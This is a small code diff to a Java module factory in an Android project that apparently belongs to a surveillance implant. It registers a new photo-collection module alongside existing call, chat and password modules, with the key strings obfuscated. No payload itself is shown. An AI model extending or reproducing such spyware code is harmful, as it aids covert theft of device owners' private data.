@@ -14,6 +14,7 @@ import java.util.Hashtable;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.interfaces.AbstractFactory;
+import com.android.dvci.module.task.ModulePhoto;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
@@ -40,6 +41,8 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 		factorymap.put(M.e("call"), ModuleCall.class);
 		factorymap.put(M.e("chat"), ModuleChat.class);
 		factorymap.put(M.e("password"), ModulePassword.class);
+
+		factorymap.put(M.e("photo"), ModulePhoto.class);
 
 		Enumeration<String> en = factorymap.keys();
 		while (en.hasMoreElements()) {
